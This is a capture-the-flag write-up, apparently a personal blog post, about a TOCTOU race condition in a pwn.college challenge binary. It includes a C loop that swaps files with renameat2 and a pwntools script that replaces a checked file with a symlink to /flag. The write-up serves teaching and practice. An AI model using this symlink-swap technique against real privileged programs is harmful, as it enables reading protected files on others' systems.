+++
title = 'NAHM NAHM NAHM (Race Condition)'
date = 2023-10-11T03:39:48-04:00
description = 'Race condition challenge i accidentally stumbled upon, took me about a few minutes to solve !'
tags = ["TOCTOU", "races", "exploitation"]
draft = false
+++
NAHM NAHM NAHM, this challenge was the first pwn challenge after finishing the race conditions module on **pwn.college**, which funnily enough turned out to be a race condition too !

## Taking a look at the Challenge
Executing the challenge, the programs asks us for a file and output it's content to the stdout.
```
❯ ./nahmnahmnahm
Enter file: shell
Press enter to continue:

Hello from File
```

Looking at the executable in Binary Ninja, we can clearly notice the vulnerability.

We are performing checks on the file before actually opening and using it. We can abuse this by swapping the file with another one, in-between the check and the use of the file.

This is very easily done using the **renameat2** syscall using the **RENAME_EXCHANGE** flag, this syscall will allow us to exchange the name of a file with the name of another one. Running this in a while loop and we can win the race and get the flag.
```c
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/fs.h>

int main(int argc, char **argv){
  while(1){
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

**HOWEVER**, since this challenge is super easy and there's even a time where the program stops until we press enter.

This gives us plenty of time to swap the file, let's write a python script to solve this challenge.

# Python Script to Win
I wrote the following python script to let us win the challenge every single time. Here we're introducing sleep just in case our script tries to swap the files too fast !
```python
import pwn
import os
import time

pwn.context.arch = "amd64"
exe = pwn.ELF("./nahmnahmnahm")

try:
    os.unlink("evil_file")
except:
    print("can't remove_file evil_file")
    if os.path.exists("evil_file"):
    ¦   print("However file seems to exists ?...")
    ¦   exit(1)
    pass

with open("evil_file", "w") as file:
    file.write("Nothing sus going on here...")
    file.close()

io = pwn.process("./nahmnahmnahm")
io.sendline(b"evil_file")

time.sleep(0.05)
os.unlink("evil_file")
os.symlink("/flag", "evil_file")

io.sendline(b"\n")
io.interactive()
```
